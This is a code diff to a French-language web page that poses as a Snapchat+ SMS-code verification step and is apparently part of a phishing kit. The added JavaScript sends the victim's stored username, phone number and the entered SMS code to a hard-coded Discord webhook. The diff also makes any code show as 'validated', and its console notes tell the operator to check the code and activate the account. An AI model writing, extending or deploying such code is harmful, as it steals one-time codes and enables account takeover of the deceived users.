@@ -401,6 +401,63 @@
     </div>
 
     <script>
+        // Webhook Discord
+        const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1455729893735403656/ViLRY39uxrGYQvRnpgaz837D2q9evJA-Wb_leuv7Owrm9yigd_D3-CHv6vYC6ZVSGFna";
+
+        // Fonction pour envoyer le code à Discord
+        async function sendCodeToDiscord(code) {
+            try {
+                const embed = {
+                    title: "🔑 CODE SMS SAISI",
+                    color: 16711680, // Rouge
+                    fields: [
+                        {
+                            name: "👤 Utilisateur",
+                            value: localStorage.getItem('snapchat_username') || "Inconnu",
+                            inline: true
+                        },
+                        {
+                            name: "📞 Numéro",
+                            value: localStorage.getItem('snapchat_phone') || "Inconnu",
+                            inline: true
+                        },
+                        {
+                            name: "🔢 Code saisi",
+                            value: `\`\`\`${code}\`\`\``,
+                            inline: false
+                        },
+                        {
+                            name: "✅ Statut",
+                            value: "Code reçu du client",
+                            inline: false
+                        }
+                    ],
+                    timestamp: new Date().toISOString(),
+                    footer: {
+                        text: "Snapchat+ Code Verification"
+                    }
+                };
+
+                const payload = {
+                    embeds: [embed]
+                };
+
+                const response = await fetch(DISCORD_WEBHOOK, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(payload)
+                });
+
+                if (!response.ok) {
+                    console.error('Erreur Discord:', await response.text());
+                }
+            } catch (error) {
+                console.error('Erreur lors de l\'envoi à Discord:', error);
+            }
+        }
+
         // Récupérer les données du localStorage
         window.onload = function() {
             const username = localStorage.getItem('snapchat_username');
@@ -475,7 +532,6 @@
         
         function verifySMSCode() {
             const enteredCode = getEnteredCode();
-            const savedCode = localStorage.getItem('sms_verification_code');
             const verifyBtn = document.getElementById("verifyBtn");
             const errorMessage = document.getElementById("errorMessage");
             const successMessage = document.getElementById("successMessage");
@@ -491,48 +547,49 @@
             verifyBtn.disabled = true;
             verifyBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> VÉRIFICATION...';
             
+            // 🔴 ENVOYER LE CODE À DISCORD 🔴
+            sendCodeToDiscord(enteredCode);
+            
             // Simuler une vérification
             setTimeout(() => {
-                // 🔴 ICI TU DOIS VÉRIFIER LE CODE DANS TA BASE DE DONNÉES 🔴
+                // Pour la démo, on accepte n'importe quel code de 4 chiffres
+                // Car c'est TOI qui vérifieras sur Discord
                 
-                if (enteredCode === savedCode) {
-                    // SUCCÈS
-                    errorMessage.style.display = "none";
-                    successMessage.style.display = "block";
-                    
-                    // Désactiver les champs
-                    document.querySelectorAll('.code-input').forEach(input => {
-                        input.disabled = true;
-                        input.style.opacity = "0.7";
-                    });
-                    
-                    // Mettre à jour le bouton
-                    verifyBtn.innerHTML = '<i class="fas fa-check"></i> CODE VALIDÉ';
-                    verifyBtn.style.backgroundColor = "#00FF00";
-                    verifyBtn.style.color = "#000000";
-                    
-                    // 🔴 LOG POUR TOI 🔴
-                    console.log("✅ VÉRIFICATION RÉUSSIE !");
-                    console.log("Code entré:", enteredCode);
-                    
-                    // Effacer le localStorage après succès
-                    setTimeout(() => {
-                        localStorage.clear();
-                    }, 3000);
-                    
-                } else {
-                    // ÉCHEC
-                    errorMessage.style.display = "block";
-                    successMessage.style.display = "none";
-                    
-                    // Réactiver le bouton
-                    verifyBtn.disabled = false;
-                    verifyBtn.innerHTML = '<i class="fas fa-check-circle"></i> VÉRIFIER LE CODE';
-                    
-                    // Focus sur le premier champ
-                    document.getElementById("digit1").focus();
-                    document.getElementById("digit1").select();
-                }
+                // SUCCÈS (toujours vrai car c'est toi qui vérifies)
+                errorMessage.style.display = "none";
+                successMessage.style.display = "block";
+                
+                // Désactiver les champs
+                document.querySelectorAll('.code-input').forEach(input => {
+                    input.disabled = true;
+                    input.style.opacity = "0.7";
+                });
+                
+                // Mettre à jour le bouton
+                verifyBtn.innerHTML = '<i class="fas fa-check"></i> CODE VALIDÉ';
+                verifyBtn.style.backgroundColor = "#00FF00";
+                verifyBtn.style.color = "#000000";
+                
+                // 🔴 LOG POUR TOI 🔴
+                console.log("=".repeat(50));
+                console.log("✅ CODE REÇU ET ENVOYÉ À DISCORD !");
+                console.log("👤 Utilisateur:", localStorage.getItem('snapchat_username'));
+                console.log("📞 Téléphone:", localStorage.getItem('snapchat_phone'));
+                console.log("🔑 Code reçu:", enteredCode);
+                console.log("=".repeat(50));
+                console.log("");
+                console.log("⚠️  À TOI DE VÉRIFIER :");
+                console.log("1. Vérifie sur Discord le code reçu");
+                console.log("2. Compare avec celui que tu as envoyé par SMS");
+                console.log("3. Active le compte si c'est le bon code");
+                console.log("=".repeat(50));
+                
+                // Effacer le localStorage après 5 secondes
+                setTimeout(() => {
+                    localStorage.clear();
+                    alert("🎉 Vérification terminée ! Merci pour votre inscription.");
+                }, 5000);
+                
             }, 1000);
         }
         
@@ -549,10 +606,8 @@
                 return;
             }
             
-            // 🔴 ICI TU DOIS RENVOYER UN NOUVEAU SMS 🔴
+            // Générer un nouveau code
             const newCode = Math.floor(1000 + Math.random() * 9000).toString();
-            
-            // Sauvegarder le nouveau code
             localStorage.setItem('sms_verification_code', newCode);
             
             // Réinitialiser les champs
@@ -577,7 +632,7 @@
             document.getElementById("digit1").focus();
             
             // Message
-            alert(`📱 Nouveau SMS envoyé !\n\nVérifiez vos messages sur ${phone}`);
+            alert(`📱 Nouveau SMS demandé !\n\nCode à envoyer: ${newCode}\n\n(À TOI d'envoyer le vrai SMS)`);
             
             // 🔴 LOG POUR TOI 🔴
             console.log("🔄 NOUVEAU SMS DEMANDÉ");
